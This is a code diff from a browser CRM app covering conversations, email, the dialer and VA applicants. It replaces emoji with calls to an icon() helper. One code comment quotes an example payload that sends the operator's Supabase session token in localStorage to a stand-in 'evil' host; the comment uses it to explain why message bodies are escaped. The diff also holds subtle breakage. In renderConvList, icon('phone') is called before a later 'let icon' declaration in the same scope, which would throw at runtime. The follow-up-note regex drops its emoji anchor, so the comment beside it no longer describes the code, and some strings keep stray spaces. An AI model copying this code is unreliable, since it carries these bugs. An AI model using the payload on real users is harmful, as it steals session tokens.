+    el.innerHTML=`<div style="text-align:center;padding:48px;color:var(--text3)"><div style="font-size:32px;margin-bottom:12px">${icon('megaphone')}</div><div style="font-size:14px;font-weight:500;color:var(--text);margin-bottom:6px">No campaigns yet</div><div style="font-size:12px">Create your first campaign to start reaching your contacts</div></div>`;
     return;
   }
   el.innerHTML = campaigns.map(c=>{
-    const typeIcon = c.type==='sms' ? '📱' : '📧';
+    const typeIcon = c.type==='sms' ? icon('smartphone') : icon('mail');
     const typeBg   = c.type==='sms' ? 'var(--red-bg)' : 'var(--accent-bg)';
     const statusMap = {active:{cls:'pill-active',label:'Active'},completed:{cls:'pill-cold',label:'Completed'},draft:{cls:'pill-new',label:'Draft'},paused:{cls:'pill-cold',label:'Paused'}};
     const stat = statusMap[c.status]||statusMap.draft;
@@ -11525,7 +11582,7 @@ function saveCampaign(status){
   closeCampBuilder();
 
   if(isLaunch && schedType==='now'){
-    showToast(`✅ "${name}" launched to ${audience_contacts.length} contacts!`);
+    showToast(`${icon('check')} "${name}" launched to ${audience_contacts.length} contacts!`);
     // Fire Zapier webhook if connected
     if(typeof fireZapierEvent==='function') fireZapierEvent('campaign_sent',{name,type,count:audience_contacts.length});
   } else {
@@ -11638,7 +11695,7 @@ function renderConvList(){
       const avCls = contact ? getAv(contact.id) : 'av-blue';
       const avClr = {'av-pink':'var(--pink)','av-blue':'var(--accent2)','av-amber':'var(--amber)','av-green':'var(--green)','av-purple':'var(--purple)'}[avCls]||'var(--accent2)';
       const avBg  = {'av-pink':'var(--pink-bg)','av-blue':'var(--accent-bg)','av-amber':'var(--amber-bg)','av-green':'var(--green-bg)','av-purple':'var(--purple-bg)'}[avCls]||'var(--accent-bg)';
-      const av    = contact ? initials(contact.name) : '☎';
+      const av    = contact ? initials(contact.name) : icon('phone');
 
       let icon, iconColor;
       if(c.direction === 'inbound'){
@@ -11668,7 +11725,7 @@ function renderConvList(){
             <span style="color:${iconColor};font-weight:700;margin-right:4px">${icon}</span>${displayName}
           </div>
           <div class="conv-item-preview" style="color:${statusColor}">${statusText} · ${numberLine}</div>
-          ${fromHtml?`<div class="conv-item-preview" style="color:var(--text3);font-size:10px">📲 via ${fromHtml}</div>`:''}
+          ${fromHtml?`<div class="conv-item-preview" style="color:var(--text3);font-size:10px">${icon('smartphone')} via ${fromHtml}</div>`:''}
         </div>
         <div class="conv-item-meta">
           <span class="conv-item-time">${relativeTime(c.ts)}</span>
@@ -11715,7 +11772,7 @@ function renderConvList(){
     const avCls    = getAv(contact.id);
     const avClr    = {'av-pink':'var(--pink)','av-blue':'var(--accent2)','av-amber':'var(--amber)','av-green':'var(--green)','av-purple':'var(--purple)'}[avCls]||'var(--accent2)';
     const avBg     = {'av-pink':'var(--pink-bg)','av-blue':'var(--accent-bg)','av-amber':'var(--amber-bg)','av-green':'var(--green-bg)','av-purple':'var(--purple-bg)'}[avCls]||'var(--accent-bg)';
-    const chIcon   = lastMsg?.ch==='email'?'📧':'📱';
+    const chIcon   = lastMsg?.ch==='email'?icon('mail'):icon('smartphone');
     const timeStr  = lastMsg ? relativeTime(lastMsg.ts) : '';
     const preview  = lastMsg ? (lastMsg.dir==='outbound'?'You: ':'')+lastMsg.body.slice(0,45)+(lastMsg.body.length>45?'…':'') : '';
     const isActive = conv.contactId===activeConvContactId;
@@ -11859,7 +11916,7 @@ function renderConvBubbles(conv, avBg, avClr){
     // Status indicator for outbound
     let statusHtml='';
     if(isOut){
-      const statusIcons={sending:'⌛ Sending',sent:'✓ Sent',delivered:'✓✓ Delivered',read:'✓✓ Read',failed:'✗ Failed',received:''};
+      const statusIcons={sending:'Sending',sent:'✓ Sent',delivered:'✓✓ Delivered',read:'✓✓ Read',failed:'✗ Failed',received:''};
       const statusClass={sent:'conv-status-sent',delivered:'conv-status-delivered',read:'conv-status-read',failed:'conv-status-failed'};
       if(statusIcons[msg.status]) statusHtml=`<div class="conv-bubble-status ${statusClass[msg.status]||''}">${statusIcons[msg.status]}</div>`;
     }
@@ -11869,7 +11926,7 @@ function renderConvBubbles(conv, avBg, avClr){
     //   '//evil/?'+localStorage.nlm_token)>" would exfiltrate the operator's
     // Supabase session token the moment they open the thread.
     const bodyHtml = msg.ch==='email'
-      ? `${msg.subject?`<div class="conv-bubble-subject">📧 ${escapeHtml(msg.subject)}</div>`:''}${escapeHtml(msg.body||'').replace(/\n/g,'<br>')}`
+      ? `${msg.subject?`<div class="conv-bubble-subject">${icon('mail')} ${escapeHtml(msg.subject)}</div>`:''}${escapeHtml(msg.body||'').replace(/\n/g,'<br>')}`
       : escapeHtml(msg.body||'');
 
     html+=`<div class="conv-bubble-wrap ${isOut?'outbound':'inbound'}">
@@ -11980,11 +12037,11 @@ function renderConvInfoPanel(contact, conv){
     <!-- Quick actions -->
     <div class="conv-info-section">
       <div class="conv-info-section-title">Quick Actions</div>
-      <div class="conv-action-btn" onclick="openContactDetail('${contact.id}')">👤 View Full Contact</div>
-      <div class="conv-action-btn" onclick="openContactModal('${contact.id}','tags')">🏷 Manage Tags</div>
-      <div class="conv-action-btn" onclick="navigate('pipeline')">📊 View Pipeline</div>
-      <div class="conv-action-btn" onclick="openFollowupModal('${contact.id}')">📅 Schedule Follow-up</div>
-      <div class="conv-action-btn" onclick="navigate('calendar');openEventModal(new Date())">📆 Schedule Meeting</div>
+      <div class="conv-action-btn" onclick="openContactDetail('${contact.id}')">${icon('user')} View Full Contact</div>
+      <div class="conv-action-btn" onclick="openContactModal('${contact.id}','tags')">${icon('tag')} Manage Tags</div>
+      <div class="conv-action-btn" onclick="navigate('pipeline')">${icon('chart')} View Pipeline</div>
+      <div class="conv-action-btn" onclick="openFollowupModal('${contact.id}')">${icon('calendar')} Schedule Follow-up</div>
+      <div class="conv-action-btn" onclick="navigate('calendar');openEventModal(new Date())">${icon('calendar')} Schedule Meeting</div>
     </div>`;
 }
 
@@ -12086,7 +12143,7 @@ async function sendConvMessage(ch){
         saveConversations();
         touchContactActivity(contact.id, 'sms');
         renderConvBubbles(conv, avBg, avClr);
-        showToast(`SMS sent to ${contact.phone} ✅`);
+        showToast(`SMS sent to ${contact.phone} ${icon('check')}`);
       } catch(e){
         newMsg.status='failed';
         saveConversations();
@@ -12114,7 +12171,7 @@ async function sendConvMessage(ch){
             newMsg.status='delivered';
             saveConversations();
             renderConvBubbles(conv, avBg, avClr);
-            showToast(`Email sent to ${contact.email} ✅`);
+            showToast(`Email sent to ${contact.email} ${icon('check')}`);
           } else { showToast('Email logged (check Brevo API key)'); }
         } catch(e){ showToast('Email logged (network error)'); }
       } else {
@@ -12250,7 +12307,7 @@ function saveNewEmailAccount(){
   closeModal();
   renderEmailAccountsList();
   renderIntEmailAccounts();
-  showToast(`✅ ${name} <${email}> connected!`);
+  showToast(`${icon('check')} ${name} <${email}> connected!`);
 }
 
 function removeEmailAccount(id){
@@ -12304,7 +12361,7 @@ async function checkEmailReplies(){
     localStorage.removeItem('nlm_inbound_emails');
     saveEmailStore();
     renderEmailPage();
-    if(added) showToast(`📬 ${added} new reply${added>1?'s':''} received!`);
+    if(added) showToast(`${icon('mail')} ${added} new reply${added>1?'s':''} received!`);
     else showToast('Inbox up to date');
   } else {
     showToast('No new replies. Set up Brevo inbound parsing to auto-receive replies.');
@@ -12499,8 +12556,8 @@ function openEmailDetail(id){
       ${isInbound
         ? `<button class="btn btn-primary btn-sm" onclick="replyToEmail('${email.id}')">↩ Reply</button>`
         : `<button class="btn btn-sm" onclick="replyToEmail('${email.id}')">↩ Reply</button>`}
-      <button class="btn btn-sm" onclick="openComposeEmail('${email.contactId||''}')">✉ New to Contact</button>
-      ${email.contactId?`<button class="btn btn-sm" onclick="openConvWithContact('${email.contactId}')">💬 View Conversation</button>`:''}
+      <button class="btn btn-sm" onclick="openComposeEmail('${email.contactId||''}')">${icon('mail')} New to Contact</button>
+      ${email.contactId?`<button class="btn btn-sm" onclick="openConvWithContact('${email.contactId}')">${icon('message')} View Conversation</button>`:''}
       ${email.status==='draft'?`<button class="btn btn-primary btn-sm" onclick="sendDraftEmail('${email.id}')">Send Now</button>`:''}
       <button class="btn btn-sm" style="color:var(--red);margin-left:auto" onclick="deleteEmail('${email.id}')">Delete</button>
     </div>`;
@@ -12556,7 +12613,7 @@ function openComposeEmail(contactId='', prefill={}){
         <div class="modal-title">Compose Email</div>
         ${hasAccount
           ? `<div style="font-size:11px;color:var(--green);margin-top:2px">✓ ${accounts.length} account${accounts.length>1?'s':''} connected</div>`
-          : `<div style="font-size:11px;color:var(--amber);margin-top:2px">⚠ No email account — will save as draft. <span onclick="closeModalForce();openAddEmailAccountModal()" style="cursor:pointer;text-decoration:underline">Add one</span></div>`}
+          : `<div style="font-size:11px;color:var(--amber);margin-top:2px">${icon('alert')} No email account — will save as draft. <span onclick="closeModalForce();openAddEmailAccountModal()" style="cursor:pointer;text-decoration:underline">Add one</span></div>`}
       </div>
       <span class="modal-close" onclick="closeModalForce()">×</span>
     </div>
@@ -12712,7 +12769,7 @@ async function dispatchEmail(email){
         : contacts.find(c=>c.email && c.email.toLowerCase()===(email.to||'').toLowerCase());
       if(emailContact) touchContactActivity(emailContact.id, 'email');
       renderEmailPage(); renderEmailFolderCounts();
-      showToast(`✅ Email sent to ${email.to}`);
+      showToast(`${icon('check')} Email sent to ${email.to}`);
     } else {
       const err=res?await res.json().catch(()=>({})):{};
       email.status='failed';
@@ -12759,7 +12816,7 @@ function openImportContacts(){
         <strong>Status values:</strong> new, active, hot, cold, done
       </div>
       <div class="soc-image-drop" onclick="document.getElementById('csv-import-input').click()" style="margin-bottom:12px">
-        📎 Click to select your CSV file
+        ${icon('paperclip')} Click to select your CSV file
         <div style="font-size:11px;margin-top:4px;color:var(--text3)">.csv files only</div>
       </div>
       <div id="import-preview" style="display:none">
@@ -12805,13 +12862,13 @@ async function aiDraftReply(channel) {
   const contact = contacts.find(c => c.id === activeConvContactId);
   const conv = conversations.find(c => c.contactId === activeConvContactId);
   const btn = document.getElementById('ai-draft-btn-' + channel);
-  if (btn) { btn.textContent = '✨ Drafting…'; btn.disabled = true; }
+  if (btn) { btn.textContent = ' Drafting…'; btn.disabled = true; }
   const result = await callAI('draft_reply', {
     channel,
     contactName: contact?.name || '',
     messages: conv?.messages || []
   });
-  if (btn) { btn.textContent = '✨ AI Draft'; btn.disabled = false; }
+  if (btn) { btn.textContent = ' AI Draft'; btn.disabled = false; }
   if (!result) return;
   bodyEl.value = result;
   if (channel === 'sms') updateConvSmsCount();
@@ -12900,7 +12957,7 @@ async function confirmCSVImport(){
   renderContactTagFilters();
   renderTagsPage();
   finishBulkAction(_importEntry, skipped===0?'Complete':'Partial', `${imported} imported${skipped?`, ${skipped} skipped (duplicates)`:''}`);
-  showToast(`✅ Imported ${imported} contacts${skipped?` (${skipped} skipped)`:''}`);
+  showToast(`${icon('check')} Imported ${imported} contacts${skipped?` (${skipped} skipped)`:''}`);
 }
 
 function exportContactsCSV(){
@@ -13060,7 +13117,7 @@ function renderBulkActionLog(){
     'Complete':'pill-active', 'In Progress':'pill-new', 'Failed':'pill-hot', 'Partial':'pill-cold',
   };
   const opIcon = {
-    'Delete':'🗑', 'Add Tags':'🏷', 'Remove Tags':'🏷', 'Move to Pipeline':'📊', 'Export':'⬇', 'Import':'⬆',
+    'Delete':icon('trash'), 'Add Tags':icon('tag'), 'Remove Tags':icon('tag'), 'Move to Pipeline':icon('chart'), 'Export':'⬇', 'Import':'⬆',
   };
   tbody.innerHTML = bulkActionLog.map(e=>`
     <tr>
@@ -13277,7 +13334,7 @@ function bulkDelete(){
         ${sel.length>20?`<div style="padding:2px 0;color:var(--text3);font-style:italic">…and ${sel.length-20} more</div>`:''}
       </div>
       <div style="background:var(--red-bg);border:1px solid rgba(255,77,109,.25);border-radius:var(--radius);padding:10px;font-size:12px;color:var(--red);font-weight:500;margin-bottom:14px">
-        ⚠️ This cannot be undone. Their conversations and call history will remain but no longer be linked to a contact.
+        ${icon('alert')} This cannot be undone. Their conversations and call history will remain but no longer be linked to a contact.
       </div>
       <div class="form-group">
         <label class="form-label">Type <strong style="color:var(--text)">${expected}</strong> to confirm:</label>
@@ -13417,7 +13474,7 @@ function renderDialerModeDisplay(){
   const el = document.getElementById('dialer-mode-display');
   if(!el) return;
   const auto = dialerSettings.autoDial;
-  const icon = auto ? '⚡' : '✋';
+  const modeIc = auto ? icon('bolt') : icon('hand');
   const title = auto ? 'Auto-advance + auto-dial' : 'Manual';
   const sub = auto
     ? `Next lead dials automatically after a ${dialerSettings.countdownSecs||3}s countdown`
@@ -13425,7 +13482,7 @@ function renderDialerModeDisplay(){
   el.innerHTML = `
     <div onclick="openDialerSettingsModal()" title="Change dialing mode"
          style="display:flex;align-items:center;gap:10px;cursor:pointer;background:var(--bg3);border:1px solid var(--border2);border-radius:var(--radius);padding:10px 12px">
-      <span style="font-size:18px;flex-shrink:0">${icon}</span>
+      <span style="font-size:18px;flex-shrink:0">${modeIc}</span>
       <div style="min-width:0;flex:1">
         <div style="font-size:13px;font-weight:600;color:var(--text)">${title}</div>
         <div style="font-size:11px;color:var(--text3)">${sub}</div>
@@ -13475,9 +13532,9 @@ function renderDialerContactPanel(force){
       </div>
     </div>
     <div style="display:flex;flex-direction:column;gap:3px;font-size:11px;color:var(--text2);margin-bottom:${tagsHtml||lastAct?'8px':'12px'}">
-      <div>📞 <span style="font-family:'DM Mono',monospace">${c.phone?pPhone(c.phone):'—'}</span></div>
-      <div>✉ ${c.email?pEmail(c.email):'—'}</div>
-      ${lastAct?`<div style="color:var(--text3)">🕐 Last activity: ${lastAct}</div>`:''}
+      <div>${icon('phone')} <span style="font-family:'DM Mono',monospace">${c.phone?pPhone(c.phone):'—'}</span></div>
+      <div>${icon('mail')} ${c.email?pEmail(c.email):'—'}</div>
+      ${lastAct?`<div style="color:var(--text3)">${icon('clock')} Last activity: ${lastAct}</div>`:''}
     </div>
     ${tagsHtml?`<div style="display:flex;flex-wrap:wrap;gap:3px;margin-bottom:12px">${tagsHtml}</div>`:''}
 
@@ -13491,7 +13548,7 @@ function renderDialerContactPanel(force){
         ${recent.length
           ? recent.map((n,i)=>`<div style="padding:8px 0;${i>0?'border-top:1px solid var(--border);':''}">
               <div style="font-size:12px;color:var(--text);line-height:1.5;white-space:pre-wrap;word-break:break-word">${esc(n.text)}</div>
-              <div style="font-size:10px;color:var(--text3);margin-top:3px">🕐 ${typeof fmtNoteTime==='function'?fmtNoteTime(n.created_at):''}${n.edited_at?` · ✏️ edited`:''}</div>
+              <div style="font-size:10px;color:var(--text3);margin-top:3px">${icon('clock')} ${typeof fmtNoteTime==='function'?fmtNoteTime(n.created_at):''}${n.edited_at?` · ${icon('pencil')} edited`:''}</div>
             </div>`).join('')
           : '<div style="font-size:11px;color:var(--text3);padding:4px 0">No notes yet — jot one above.</div>'}
         ${notes.length>5?`<div style="font-size:10px;color:var(--text3);padding-top:6px">+${notes.length-5} more — see full contact</div>`:''}
@@ -13517,7 +13574,7 @@ async function addDialerNote(contactId){
   try {
     await sb.patch('contacts', contactId, { notes:c.notes });
     if(typeof touchContactActivity==='function') touchContactActivity(contactId, 'update');
-    showToast('Note added ✅');
+    showToast('Note added ');
   } catch(e){ showToast('Error saving note','error'); }
   // Keep the open contact-detail panel in sync if it's showing this contact
   if(typeof renderContactNotes==='function' && document.getElementById('cd-notes-list')){
@@ -13579,7 +13636,7 @@ function dialerHistRowHTML(c){
   }
   const av = contact
     ? `<div class="av-sm ${getAv(contact.id)}" style="flex-shrink:0">${initials(contact.name)}</div>`
-    : `<div class="av-sm" style="flex-shrink:0;background:var(--bg4);color:var(--text3)">☎</div>`;
+    : `<div class="av-sm" style="flex-shrink:0;background:var(--bg4);color:var(--text3)">${icon('phone')}</div>`;
   const numStr = (c.number||'').replace(/'/g,'');
   const fromHtml = callFromHtml(c);
   const onClick = contact
@@ -13590,7 +13647,7 @@ function dialerHistRowHTML(c){
     ${av}
     <div style="flex:1;min-width:0">
       <div style="font-size:13px;font-weight:500;color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${displayName}${dispoPill}</div>
-      <div style="font-size:11px;color:var(--text3)">${(contact||hasName)?(pPhone(phoneFmt)+' · '):''}${statusText}${fromHtml?` · 📲 ${fromHtml}`:''}${!contact?' · not in contacts':''}</div>
+      <div style="font-size:11px;color:var(--text3)">${(contact||hasName)?(pPhone(phoneFmt)+' · '):''}${statusText}${fromHtml?` · ${icon('smartphone')} ${fromHtml}`:''}${!contact?' · not in contacts':''}</div>
     </div>
     <div style="font-size:11px;color:var(--text3);flex-shrink:0">${time}</div>
   </div>`;
@@ -13687,22 +13744,22 @@ function renderDialerReport(){
 
   statsEl.innerHTML = `
     <div class="dialer-stat">
-      <div class="dialer-stat-label">📞 Dials Made</div>
+      <div class="dialer-stat-label">${icon('phone')} Dials Made</div>
       <div class="dialer-stat-value">${dials}</div>
       <div class="dialer-stat-sub">call attempts</div>
     </div>
     <div class="dialer-stat">
-      <div class="dialer-stat-label">✅ Connected</div>
+      <div class="dialer-stat-label">${icon('check')} Connected</div>
       <div class="dialer-stat-value" style="color:var(--green)">${connected}</div>
       <div class="dialer-stat-sub">${dials-connected} no-answer/failed</div>
     </div>
     <div class="dialer-stat">
-      <div class="dialer-stat-label">📊 Connect Rate</div>
+      <div class="dialer-stat-label">${icon('chart')} Connect Rate</div>
       <div class="dialer-stat-value" style="color:${rateColor}">${rate}%</div>
       <div class="dialer-stat-sub">connected ÷ dials</div>
     </div>
     <div class="dialer-stat">
-      <div class="dialer-stat-label">⏱ Talk Time</div>
+      <div class="dialer-stat-label">${icon('clock')} Talk Time</div>
       <div class="dialer-stat-value" style="font-size:20px">${talkStr}</div>
       <div class="dialer-stat-sub">total on calls</div>
     </div>`;
@@ -13741,7 +13798,7 @@ function renderDialerQueue(){
   const q = getDialerQueueContacts();
   if(countEl) countEl.textContent = q.length ? `(${q.length} in queue)` : '';
   if(!q.length){
-    list.innerHTML = '<div style="font-size:12px;color:var(--text3);text-align:center;padding:24px 8px;line-height:1.6">Queue is empty.<br>Search above, or use<br>"📞 Add to Queue" on the Contacts page.</div>';
+    list.innerHTML = '<div style="font-size:12px;color:var(--text3);text-align:center;padding:24px 8px;line-height:1.6">Queue is empty.<br>Search above, or use<br>" Add to Queue" on the Contacts page.</div>';
     return;
   }
   list.innerHTML = q.map((c,i)=>`
@@ -13750,7 +13807,7 @@ function renderDialerQueue(){
       <div class="av-sm ${getAv(c.id)}" style="flex-shrink:0">${initials(c.name)}</div>
       <div style="flex:1;min-width:0">
         <div style="font-size:12px;font-weight:500;color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${pName(c.name||'Unknown')}</div>
-        <div style="font-size:10px;color:var(--text3);font-family:'DM Mono',monospace">${c.phone?pPhone(c.phone):'⚠ no phone'}</div>
+        <div style="font-size:10px;color:var(--text3);font-family:'DM Mono',monospace">${c.phone?pPhone(c.phone):' no phone'}</div>
       </div>
       <span class="dialer-q-x" onclick="removeFromDialerQueue('${c.id}')" title="Remove from queue">×</span>
     </div>
@@ -13771,7 +13828,7 @@ function renderDialerNowCalling(){
       <div style="font-size:15px;font-weight:600;color:var(--text);margin-bottom:2px">${pName(c.name)}</div>
       <div style="font-size:12px;color:var(--text3);font-family:'DM Mono',monospace;margin-bottom:18px">${c.phone?pPhone(c.phone):''}</div>
       <div style="display:flex;gap:8px;justify-content:center">
-        <button class="btn btn-primary btn-sm" onclick="cancelDialerCountdown(true)">📞 Call Now</button>
+        <button class="btn btn-primary btn-sm" onclick="cancelDialerCountdown(true)">${icon('phone')} Call Now</button>
         <button class="btn btn-sm" onclick="cancelDialerCountdown(false)">Cancel</button>
       </div>`;
     return;
@@ -13780,9 +13837,9 @@ function renderDialerNowCalling(){
   // Empty queue
   if(!q.length){
     el.innerHTML = `
-      <div style="font-size:42px;margin-bottom:14px;opacity:.5">📞</div>
+      <div style="font-size:42px;margin-bottom:14px;opacity:.5">${icon('phone')}</div>
       <div style="font-size:15px;font-weight:600;color:var(--text);margin-bottom:6px">Queue is empty</div>
-      <div style="font-size:12px;color:var(--text3);line-height:1.6">Add contacts using the search on the left,<br>or select contacts on the Contacts page<br>and click "📞 Add to Queue".</div>`;
+      <div style="font-size:12px;color:var(--text3);line-height:1.6">Add contacts using the search on the left,<br>or select contacts on the Contacts page<br>and click "${icon('phone')} Add to Queue".</div>`;
     return;
   }
 
@@ -13805,8 +13862,8 @@ function renderDialerNowCalling(){
     <div style="font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.08em;margin-bottom:12px">Up Next</div>
     <div class="av-sm ${getAv(c.id)}" style="width:64px;height:64px;font-size:22px;margin:0 auto 12px">${initials(c.name)}</div>
     <div style="font-size:19px;font-weight:700;color:var(--text);margin-bottom:3px">${pName(c.name)}</div>
-    <div style="font-size:13px;color:var(--text3);font-family:'DM Mono',monospace;margin-bottom:20px">${c.phone?pPhone(c.phone):'⚠ No phone number'}</div>
-    <button class="btn btn-primary" onclick="dialerCallTop()" style="font-size:14px;padding:10px 24px" ${!c.phone?'disabled':''}>📞 Call ${(c.name||'').split(' ')[0]}</button>
+    <div style="font-size:13px;color:var(--text3);font-family:'DM Mono',monospace;margin-bottom:20px">${c.phone?pPhone(c.phone):' No phone number'}</div>
+    <button class="btn btn-primary" onclick="dialerCallTop()" style="font-size:14px;padding:10px 24px" ${!c.phone?'disabled':''}>${icon('phone')} Call ${(c.name||'').split(' ')[0]}</button>
     <div style="font-size:11px;color:var(--text3);margin-top:14px">${q.length} lead${q.length>1?'s':''} in queue${dialerSettings.autoDial?' · auto-dial ON':''}</div>
     ${fromNum?`<div style="font-size:11px;color:var(--text3);margin-top:4px">Calling from <span style="color:var(--text2);font-family:'DM Mono',monospace">${pPhone(fromNum)}</span></div>`:''}`;
 }
@@ -13833,7 +13890,7 @@ function renderDialerSearchResults(query){
       <div class="av-sm ${getAv(c.id)}" style="flex-shrink:0">${initials(c.name)}</div>
       <div style="flex:1;min-width:0">
         <div style="color:var(--text);font-weight:500;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${pName(c.name)||'Unknown'}</div>
-        <div style="font-size:10px;color:var(--text3);font-family:'DM Mono',monospace">${c.phone?pPhone(c.phone):'⚠ no phone'}</div>
+        <div style="font-size:10px;color:var(--text3);font-family:'DM Mono',monospace">${c.phone?pPhone(c.phone):' no phone'}</div>
       </div>
     </div>
   `).join('');
@@ -14005,7 +14062,7 @@ function showDialerDisposition(ctx){
   `).join('');
   openModal(`
     <div class="modal-head">
-      <div class="modal-title">📞 Call Disposition</div>
+      <div class="modal-title">${icon('phone')} Call Disposition</div>
       <span class="modal-close" onclick="_finishDisposition()" title="Close">×</span>
     </div>
     <div class="modal-body">
@@ -14036,7 +14093,7 @@ function showDialerDisposition(ctx){
           <button type="button" class="fum-type-btn" data-type="email" title="Email"       onclick="setDispoFollowupType('email')">${followupTypeSvg('email', 16)}</button>
           <button type="button" class="fum-type-btn" data-type="meet"  title="Google Meet" onclick="setDispoFollowupType('meet')">${followupTypeSvg('meet',  16)}</button>
         </div>
-        <button class="btn btn-primary btn-sm" style="margin-top:10px;font-size:12px" onclick="commitDispoFollowup('${c.id}')">📅 Schedule follow-up</button>
+        <button class="btn btn-primary btn-sm" style="margin-top:10px;font-size:12px" onclick="commitDispoFollowup('${c.id}')">${icon('calendar')} Schedule follow-up</button>
       </div>
       <div style="font-size:10px;color:var(--text3);margin-top:5px">Adds a "Follow-up" event to your CRM calendar.</div>
     </div>
@@ -14057,7 +14114,7 @@ async function applyDisposition(contactId, dispoValue){
   const dispo = dialerSettings.dispositions.find(d=>d.value===dispoValue);
   const label = dispo?.label || dispoValue;
   const userNote = (document.getElementById('dispo-note-input')?.value || '').trim();
-  const noteText = userNote ? `📞 Call disposition: ${label} — ${userNote}` : `📞 Call disposition: ${label}`;
+  const noteText = userNote ? `${icon('phone')} Call disposition: ${label} — ${userNote}` : `${icon('phone')} Call disposition: ${label}`;
   const ts = new Date().toISOString();
 
   // No-op if user clicks the same pill twice
@@ -14219,7 +14276,7 @@ function _fmtFollowupNoteDate(iso){
   return new Date(iso).toLocaleString([],{weekday:'short',month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
 }
 
-// Used to write a "📅 Follow-up scheduled/rescheduled/cleared …" entry into
+// Used to write a " Follow-up scheduled/rescheduled/cleared …" entry into
 // the contact's notes timeline so the follow-up surfaced wherever notes were
 // shown (contact card Info tab, dialer right-side panel, etc.). That was
 // duplicated information — the Activity tab's Follow-ups section already
@@ -14232,13 +14289,13 @@ async function _appendFollowupNote(contactId, action /*, iso, extraNote */){
   if(typeof touchContactActivity === 'function') touchContactActivity(contactId, 'update');
 }
 
-// Legacy auto-notes look like "📅 Follow-up scheduled Wed May 22, 3:00 PM"
-// or "📅 Follow-up rescheduled to …" or "📅 Follow-up cleared". They're
+// Legacy auto-notes look like " Follow-up scheduled Wed May 22, 3:00 PM"
+// or " Follow-up rescheduled to …" or " Follow-up cleared". They're
 // hidden from the Notes list so all follow-up info lives in one place
 // (the Activity tab). Real user-typed notes that happen to start with the
-// 📅 emoji are unaffected — the prefix requires "Follow-up" after it.
+//  emoji are unaffected — the prefix requires "Follow-up" after it.
 function _isFollowupAutoNote(text){
-  return /^📅\s*Follow-up\s+(scheduled|rescheduled|cleared)/i.test(String(text||''));
+  return /^\s*Follow-up\s+(scheduled|rescheduled|cleared)/i.test(String(text||''));
 }
 
 // Open the follow-up modal. Pass eventId to edit an existing follow-up,
@@ -14266,7 +14323,7 @@ function openFollowupModal(contactId, eventId){
 
   openModal(`
     <div class="modal-head">
-      <div class="modal-title">📅 ${isEdit?'Edit':'Schedule'} Follow-up</div>
+      <div class="modal-title">${icon('calendar')} ${isEdit?'Edit':'Schedule'} Follow-up</div>
       <span class="modal-close" onclick="closeModal()">×</span>
     </div>
     <div class="modal-body">
@@ -14464,7 +14521,7 @@ function saveDialerSettingsModal(){
   saveDialerSettings();
   closeModal();
   if(document.getElementById('page-dialer')?.classList.contains('active')) renderDialerPage();
-  showToast('Dialer settings saved ✅');
+  showToast('Dialer settings saved ');
 }
 
 // Close the dialer search dropdown when clicking elsewhere
@@ -14545,9 +14602,9 @@ function renderVaApplicantsPage(){
         <td style="white-space:nowrap;display:flex;gap:6px;align-items:center">
           <button class="btn btn-sm" onclick="openVaApplicantModal('${v.id}')">View</button>
           ${!isActive
-            ? `<button class="btn btn-sm" style="font-size:11px;background:#059669;color:#fff;border:none" onclick="activateVaForMatching('${v.id}')">⚡ Activate</button>`
+            ? `<button class="btn btn-sm" style="font-size:11px;background:#059669;color:#fff;border:none" onclick="activateVaForMatching('${v.id}')">${icon('bolt')} Activate</button>`
             : `<span style="font-size:11px;color:#059669;font-weight:600">✓ Active</span>`}
-          <button class="btn btn-sm" title="Delete applicant" style="font-size:12px;color:var(--red);border-color:var(--border)" onclick="deleteVaApplicant('${v.id}')">🗑</button>
+          <button class="btn btn-sm" title="Delete applicant" style="font-size:12px;color:var(--red);border-color:var(--border)" onclick="deleteVaApplicant('${v.id}')">${icon('trash')}</button>
         </td>
       </tr>`;
     }).join('');
@@ -14617,11 +14674,11 @@ function openVaApplicantModal(id){
   ].filter(Boolean).join('');
   const act = (href, label, isMail) => { const s = isMail ? (href ? 'mailto:'+href : '') : safeUrl(href); return s ? `<a href="${esc(s)}" ${isMail?'':'target="_blank" rel="noopener noreferrer"'} class="btn btn-sm" style="font-size:11px;text-decoration:none">${esc(label)}</a>` : ''; };
   const actions = [
-    act(v.email, '✉ Email', true),
-    act(v.cv_link, '📄 CV'),
+    act(v.email, 'Email', true),
+    act(v.cv_link, 'CV'),
     act(v.video_intro_link, '▶ Video'),
     act(v.linkedin_url, 'in LinkedIn'),
-    act(v.portfolio_url, '🔗 Portfolio'),
+    act(v.portfolio_url, 'Portfolio'),
   ].filter(Boolean).join('');
 
   openModal(`
@@ -14638,7 +14695,7 @@ function openVaApplicantModal(id){
             <span style="display:inline-block;padding:2px 10px;border-radius:999px;font-size:11px;font-weight:700;background:${statusCol}18;color:${statusCol}">${esc(statusLabel)}</span>
             ${v.activated_at ? `<span style="font-size:11px;color:#059669;font-weight:600">✓ In matching pool</span>` : ''}
           </div>
-          ${loc ? `<div style="font-size:12px;color:var(--text2);margin-top:3px">📍 ${loc}</div>` : ''}
+          ${loc ? `<div style="font-size:12px;color:var(--text2);margin-top:3px">${icon('pin')} ${loc}</div>` : ''}
           ${submitted ? `<div style="font-size:11px;color:var(--text3);margin-top:2px">Submitted ${esc(submitted)}</div>` : ''}
           ${(v.roles||[]).length ? `<div style="display:flex;flex-wrap:wrap;gap:5px;margin-top:7px">${(v.roles||[]).slice(0,3).map(r=>`<span style="display:inline-block;background:${statusCol}14;color:${statusCol};border-radius:999px;padding:2px 9px;font-size:11px;font-weight:600">${esc(vaPretty('roles', r))}</span>`).join('')}${(v.roles||[]).length>3?`<span style="font-size:11px;color:var(--text3);align-self:center">+${(v.roles||[]).length-3} more</span>`:''}</div>` : ''}
         </div>
@@ -14709,10 +14766,10 @@ function openVaApplicantModal(id){
           </div>
         </div>
         <div style="border-top:1px solid var(--border);padding-top:14px;display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap">
-          <button class="btn" style="color:var(--red);border-color:var(--red)" onclick="deleteVaApplicant('${id}')">🗑 Delete Application</button>
+          <button class="btn" style="color:var(--red);border-color:var(--red)" onclick="deleteVaApplicant('${id}')">${icon('trash')} Delete Application</button>
           <div>
           ${!v.activated_at
-            ? `<button class="btn" style="background:#059669;color:#fff" onclick="activateVaForMatching('${id}');closeModal()">⚡ Activate for Matching</button>`
